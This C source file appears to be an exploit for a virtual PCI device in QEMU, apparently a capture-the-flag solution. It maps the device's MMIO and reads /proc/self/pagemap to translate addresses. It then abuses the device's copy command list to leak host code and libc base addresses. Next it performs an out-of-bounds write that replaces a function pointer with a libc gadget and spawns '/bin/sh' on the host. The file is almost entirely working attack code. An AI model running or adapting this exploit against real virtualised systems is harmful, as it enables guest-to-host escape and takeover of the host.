#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <fcntl.h>
#include <stdint.h>
#include <assert.h>
#include <string.h>
#include <time.h>

#define PAGE_SIZE 0x1000

uint64_t base = 0;
int pm = 0;

int mmio_read(uint64_t addr)
{
    return *((uint64_t *)(base + addr));
}

void mmio_write(uint64_t addr, uint64_t value)
{
    *((uint64_t *)(base + addr)) = value;
}

uint32_t v2p(void *addr)
{
    uint32_t index = (uint64_t)addr / PAGE_SIZE;
    lseek(pm, index * 8, SEEK_SET);
    uint64_t num = 0;
    read(pm, &num, 8);
    return ((num & (((uint64_t)1 << 55) - 1)) << 12) + (uint64_t)addr % PAGE_SIZE;
}

void bubble_sort(int arr[], int len)
{
    int i, j, temp;
    for (i = 0; i < len - 1; i++)
        for (j = 0; j < len - 1 - i; j++)
            if (arr[j] > arr[j + 1])
            {
                temp = arr[j];
                arr[j] = arr[j + 1];
                arr[j + 1] = temp;
            }
}

int main()
{
    //puts("[*]exploit exp1");
    int fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
    assert(fd != -1);

    base = (uint64_t)mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    assert(base != -1);

    pm = open("/proc/self/pagemap", O_RDONLY);
    assert(pm != -1);

    /* 
    mmio_write(8,2)   //opaque->cp_state.CP_list_src = val;
    mmio_write(16,1) //opaque->cp_state.CP_list_cnt = val;
    mmio_write(24,1)//opaque->cp_state.cmd = val; //timer
    read
    opaque->handling;                  // addr==0
    opaque->cp_state.CP_list_src;        // addr==8
    opaque->cp_state.CP_list_cnt;          // addr==16
    opaque->cp_state.cmd;              // addr==24

    CP_src
     CP_cnt   
     CP_dst
            cmd=2
     / src ->  buffer
     cmd=4
     / buffer->dst
*/

//get 2 neighbor page
    void *addr[] = {malloc(0x1000), malloc(0x1000), malloc(0x1000), malloc(0x1000), malloc(0x1000), malloc(0x1000)};
    int len = (int)sizeof(addr) / sizeof(*addr);
    for (int i = 0; i < len; i++)
    {
        memset(addr[i], i, 0x1000);
    }
    int addrv2p[] = {v2p(addr[0]), v2p(addr[1]), v2p(addr[2]), v2p(addr[3]), v2p(addr[4]), v2p(addr[5])};

    int addrv2p_sort[] = {v2p(addr[0]), v2p(addr[1]), v2p(addr[2]), v2p(addr[3]), v2p(addr[4]), v2p(addr[5])};

    bubble_sort(addrv2p_sort, len);
    void *tmp1, *tmp2;

    for (int i = 0; i < len - 1; i++)
    {
        if ((addrv2p_sort[i + 1] - addrv2p_sort[i]) == 0x1000)
        {
            tmp1 = addrv2p_sort[i];
            tmp2 = addrv2p_sort[i + 1];
            break;
        }
    }
    if(tmp1 == NULL){
        printf("[-]dont find neighbor page");
        return 0;
    }
    void *buf1, *buf2;
    for (int i = 0; i < len; i++)
    {
        if (addrv2p[i] == tmp1)
        {
            buf1 = addr[i];
        }
        if (addrv2p[i] == tmp2)
        {
            buf2 = addr[i];
        }
    }

    // for (int i = 0; i < len; i++)
    // {
    //     printf("%llx %llx\n", addr[i], v2p(addr[i]));
    // }
    // printf("%llx %llx\n", buf1, buf2);

    void *buf = malloc(0x1000);

    memset(buf, 0, 0x1000);

    mmio_write(16, 1); //CP_list_cnt = 1
    *(uint64_t *)(buf) = (uint64_t)0;
    uint64_t read_numbers = 0x1500;
    *(uint64_t *)(buf + 8) = (uint64_t)(read_numbers);
    *(uint64_t *)(buf + 16) = (uint64_t)v2p(buf1);
    mmio_write(8, v2p(buf)); //CP_list_src = buf1

    //-------------⬇

    //printf("cmd:0x%llx\n", mmio_read(24));
    // printf("buf1： ");
    // for (int i=0x0;i<0x1000;i+=8){
    //     printf("%llx ",*(uint64_t*)(buf1+i));
    // }
    // printf("\n");
    // printf("buf2： ");
    // for (int i=0x0;i<0x1000;i+=8){
    //     printf("%llx ",*(uint64_t*)(buf2+i));
    // }
    // printf("\n");
    //---------------

    mmio_write(24, 4); //cmd = 4 buf1fer -> dst
    sleep(0.5);

    //-------------⬇

    //printf("cmd:0x%llx\n", mmio_read(24));
    // printf("buf1： ");
    // for (int i=0x0;i<0x1000;i+=8){
    //     printf("%llx ",*(uint64_t*)(buf1+i));
    // }
    // printf("\n");
    // printf("buf2： ");
    // for (int i=0x0;i<0x1000;i+=8){
    //     printf("%llx ",*(uint64_t*)(buf2+i));
    // }
    // printf("\n");

    uint64_t code_base = *(uint64_t *)(buf2 + 0x10) - 0x4dce80;
    uint64_t libc_base = *(uint64_t *)(buf2 + 0x258) - 0x3ebce0;
    uint64_t buffaddr = *(uint64_t *)(buf2 + 0x18)+0xa00;
    printf("[+]codebase:0x%llx\n[+]libcbase:0x%llx\n[+]buffaddr:0x%llx\n", code_base, libc_base,buffaddr);

    //0x10a38c 0x4f322 0x4f2c5  remote
    //local 0x4f3d5 0x4f432 0x10a41c

    *(uint64_t *)(buf2 + 0x10) =libc_base+0x4f550;//code_base+0x00005B5C15;// ////0x4f440;//;//code_base + 0x00005B5C15;
    *(uint64_t *)(buf2 + 0x18) = buffaddr;//
    //  oob write
    uint64_t CP_list_cnt = 0x11;
    mmio_write(16, CP_list_cnt);
    for (int i = 0; i < CP_list_cnt; i++)
    {
        *(uint64_t *)(buf + 8 * (i * 3)) = (uint64_t)(v2p(buf1)); // src
        *(uint64_t *)(buf + 8 * (i * 3 + 1)) = (uint64_t)(0x1020);
        *(uint64_t *)(buf + 8 * (i * 3 + 2)) = (uint64_t)(v2p(buf1)); //dst
    }
    for (int i=0x0;i<0x1000;i+=0x20){
        strcpy(buf1+i,"/bin/sh\x00");
    }

    mmio_write(8, v2p(buf)); //CP_list_src = buf;
    mmio_write(24, 1);       //cmd = 1
    sleep(0.5);

    //call
    mmio_write(24, 10);
    return 0;
}